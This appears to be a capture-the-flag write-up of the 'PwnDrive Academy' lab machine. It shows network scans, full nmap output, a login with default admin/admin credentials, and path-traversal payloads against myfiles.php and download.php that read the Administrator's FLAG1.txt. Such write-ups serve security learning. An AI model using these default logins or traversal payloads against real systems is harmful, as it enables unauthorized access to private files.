#  Title : PwnDrive Academy

- you are give and ip address and the instruction was

```sh

Scan the network in the range 10.150.150.10 - 10.150.150.254 to find vulnerable targets!

```

- when i run the scan on the ip

```sh
$ fping -agq 10.150.150.10/24
10.150.150.2
10.150.150.11
10.150.150.12
10.150.150.15
10.150.150.17
10.150.150.18
10.150.150.21
10.150.150.27
10.150.150.38
10.150.150.48
10.150.150.55
10.150.150.56
10.150.150.57
10.150.150.59
10.150.150.66
10.150.150.69
10.150.150.100
10.150.150.113
10.150.150.123
10.150.150.122
10.150.150.129
10.150.150.130
10.150.150.134
10.150.150.135
10.150.150.136
10.150.150.137
10.150.150.138
10.150.150.145
10.150.150.146
10.150.150.147
10.150.150.150
10.150.150.166
10.150.150.178
10.150.150.181
10.150.150.182
10.150.150.188
10.150.150.193
10.150.150.199
10.150.150.202
10.150.150.212
10.150.150.219
10.150.150.222
10.150.150.224
10.150.150.226
10.150.150.232
10.150.150.242

```

- this are the list of ip that are live and the instruction was for us to start from 10.150.150.11

## Recon

### enumeration


```sh

$ nmap -sV -sC 10.150.150.11       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 15:28 WAT
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 13.33% done; ETC: 15:30 (0:00:33 remaining)
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 13.33% done; ETC: 15:30 (0:00:39 remaining)
Stats: 0:00:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 40.00% done; ETC: 15:29 (0:00:14 remaining)
Nmap scan report for 10.150.150.11
Host is up (0.17s latency).
Not shown: 985 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Xlight ftpd 3.9
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.9)
|_http-title: PwnDrive - Your Personal Online Storage
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/https     Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       secure flag not set and HTTPS in use
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.9
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-title: PwnDrive - Your Personal Online Storage
445/tcp   open  microsoft-ds  Windows Server 2008 R2 Enterprise 7601 Service Pack 1 microsoft-ds
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2012 11.00.2100.00; RTM
| ms-sql-info: 
|   10.150.150.11:1433: 
|     Version: 
|       name: Microsoft SQL Server 2012 RTM
|       number: 11.00.2100.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-21T12:57:09
|_Not valid after:  2054-03-21T12:57:09
|_ssl-date: 2025-08-14T14:49:57+00:00; +19m09s from scanner time.
| ms-sql-ntlm-info: 
|   10.150.150.11:1433: 
|     Target_Name: PWNDRIVE
|     NetBIOS_Domain_Name: PWNDRIVE
|     NetBIOS_Computer_Name: PWNDRIVE
|     DNS_Domain_Name: PwnDrive
|     DNS_Computer_Name: PwnDrive
|_    Product_Version: 6.1.7601
3306/tcp  open  mysql         MariaDB 5.5.5-10.4.14
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.14-MariaDB
|   Thread ID: 19
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, LongColumnFlag, Speaks41ProtocolOld, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, InteractiveClient, FoundRows, ODBCClient, SupportsTransactions, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: {v_Z$A['O8i,<)US#NCD
|_  Auth Plugin Name: mysql_native_password
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: PWNDRIVE
|   NetBIOS_Domain_Name: PWNDRIVE
|   NetBIOS_Computer_Name: PWNDRIVE
|   DNS_Domain_Name: PwnDrive
|   DNS_Computer_Name: PwnDrive
|   Product_Version: 6.1.7601
|_  System_Time: 2025-08-14T14:49:46+00:00
|_ssl-date: 2025-08-14T14:49:58+00:00; +19m09s from scanner time.
| ssl-cert: Subject: commonName=PwnDrive
| Not valid before: 2025-08-13T13:17:04
|_Not valid after:  2026-02-12T13:17:04
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Enterprise 7601 Service Pack 1 (Windows Server 2008 R2 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: PwnDrive
|   NetBIOS computer name: PWNDRIVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-14T07:49:44-07:00
|_clock-skew: mean: 1h19m09s, deviation: 2h38m45s, median: 19m08s
|_nbstat: NetBIOS name: PWNDRIVE, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:89:87:cb (VMware)
| smb2-time: 
|   date: 2025-08-14T14:49:44
|_  start_date: 2024-03-21T12:57:13

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.67 seconds
                         

```

- from our scan we can see it a window server and it host a web application on port 80

- i spin up my burpsult for me to intercept our request and add our target ip to my scope 

- i found a login page which  try `admin/admin` has the username and password which i gain access

- saw the `http://10.150.150.11/myfiles.php?folder=/`  i proceed to check if it vulnerable to path transerval, which it was....

- since i notice it window server i create my payload toward it


```sh

/myfiles.php?folder=/../../../../../../../../../Users/ 

```

- which i was able to see all users on the server

- proceed to check the file on the administrator account 

- 

```sh
/../../../../../../../../../Users/Administrator/

i check the desktop directory

/../../../../../../../../../Users/Administrator/Desktop/ 

```

- i saw a file name `FLAG1.txt` but  able to read the file with this endpoints 

- i saw an which it use to read file, which i exploit and use it to read the file

```sh

/download.php?mode=view_file_content&filename=upload/2/../../../../../../../../../Users/Administrator/Desktop/FLAG1.txt 

```